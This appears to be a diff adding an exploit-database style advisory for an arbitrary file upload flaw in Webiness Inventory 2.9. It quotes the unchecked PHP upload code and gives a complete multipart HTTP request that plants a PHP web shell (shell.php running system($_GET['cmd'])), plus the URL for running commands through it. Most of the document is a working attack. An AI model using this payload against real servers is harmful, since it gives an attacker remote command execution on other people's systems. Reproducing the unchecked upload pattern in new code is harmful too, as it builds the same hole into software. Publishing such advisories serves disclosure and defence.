@@ -1,0 +1,120 @@
+# Exploit Title:  Webiness Inventory 2.9 - Arbitrary File Upload
+# Date: 2018-10-27
+# Exploit Author: Boumediene KADDOUR 
+# Unit: Algerie Telecom R&D Unit
+# Software Link: https://github.com/webiness/webiness_inventory
+# Version: 2.9<
+# Tested on: WAMP windows 10 x64
+# CVE: unknown
+
+# Vulnerable Code: https://github.com/webiness/webiness_inventory/blob/master/protected/library/ajax/WsSaveToModel.php
+
+46 foreach ($_FILES as $file) {
+47    $fileName = $file['name'];
+48    $fileTmp = $file['tmp_name'];
+49    $destDir = WsROOT.'/runtime/'.$model;
+50
+51    $field = key($_FILES);
+52
+53    // files are upload to "runtime" directory create destination directory
+54    // if not exist
+55    if (!file_exists($destDir)) {
+56        mkdir($destDir, 0777, true);
+57    }
+58
+59    // allowed file size is 3MB
+60    if ($file['size'] > 3145728) {
+61        continue;
+62    }
+63
+64   // remove old file with same name
+65    if (file_exists($destDir.'/'.$fileName)) {
+66        unlink($destDir.'/'.$fileName);
+67    }
+68
+69    // upload file
+70    move_uploaded_file($fileTmp, $destDir.'/'.$fileName);
+71    $m->$field= $fileName;
+72 }
+
+# Proof Of Concept
+
+POST /webiness_inventory-2.3/protected/library/ajax/WsSaveToModel.php HTTP/1.1
+Host: 172.16.122.4
+Content-Length: 1838
+Accept: */*
+Origin: http://172.16.122.4
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUOOyIF2f26nDrsM7
+Referer: http://172.16.122.4/webiness_inventory-2.3/index.php?request=partners/index/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,fr;q=0.8,fr-FR;q=0.7
+Cookie: resolve_ids=0; order_dir_list_by=1A; _csrf=b49cff27d7c0ccd3a8dd5af3813025249dc909f2a20c12efcb7770f945715b06a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%224dWxR4kKmI-ZSWJBsigl0tHhdecVhozc%22%3B%7D; language=32d49278f28c78229de164fe79dc13b6adb3c98af2d133240eb1ffc44771ad3da%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22language%22%3Bi%3A1%3Bs%3A2%3A%22en%22%3B%7D; PHPSESSID=h66id6epvp8g1uoshrdog53323
+Connection: close
+
+------WebKitFormBoundaryUOOyIF2f26nDrsM7
+Content-Disposition: form-data; name="model_name"
+
+PartnerModel
+------WebKitFormBoundaryUOOyIF2f26nDrsM7
+Content-Disposition: form-data; name="id"
+
+2
+------WebKitFormBoundaryUOOyIF2f26nDrsM7
+Content-Disposition: form-data; name="partner_name"
+
+My crucial Partner
+------WebKitFormBoundaryUOOyIF2f26nDrsM7
+Content-Disposition: form-data; name="logo"; filename="shell.php"
+Content-Type: application/octet-stream
+
+<?php system($_GET['cmd']);?>
+------WebKitFormBoundaryUOOyIF2f26nDrsM7
+Content-Disposition: form-data; name="id_number"
+
+25
+------WebKitFormBoundaryUOOyIF2f26nDrsM7
+Content-Disposition: form-data; name="tax_number"
+
+225588664477
+------WebKitFormBoundaryUOOyIF2f26nDrsM7
+Content-Disposition: form-data; name="iban"
+
+------WebKitFormBoundaryUOOyIF2f26nDrsM7
+Content-Disposition: form-data; name="address1"
+
+------WebKitFormBoundaryUOOyIF2f26nDrsM7
+Content-Disposition: form-data; name="address2"
+
+------WebKitFormBoundaryUOOyIF2f26nDrsM7
+Content-Disposition: form-data; name="region_state"
+
+------WebKitFormBoundaryUOOyIF2f26nDrsM7
+Content-Disposition: form-data; name="zip"
+
+------WebKitFormBoundaryUOOyIF2f26nDrsM7
+Content-Disposition: form-data; name="city"
+
+------WebKitFormBoundaryUOOyIF2f26nDrsM7
+Content-Disposition: form-data; name="country"
+
+------WebKitFormBoundaryUOOyIF2f26nDrsM7
+Content-Disposition: form-data; name="email"
+
+------WebKitFormBoundaryUOOyIF2f26nDrsM7
+Content-Disposition: form-data; name="web"
+
+------WebKitFormBoundaryUOOyIF2f26nDrsM7
+Content-Disposition: form-data; name="phone_number"
+
+------WebKitFormBoundaryUOOyIF2f26nDrsM7
+Content-Disposition: form-data; name=""
+
+------WebKitFormBoundaryUOOyIF2f26nDrsM7
+Content-Disposition: form-data; name=""
+
+------WebKitFormBoundaryUOOyIF2f26nDrsM7--
+
+# Access your webshell via the below link
+http://172.16.122.4/webiness_inventory-2.3/runtime/PartnerModel/shell.php?cmd=whoami
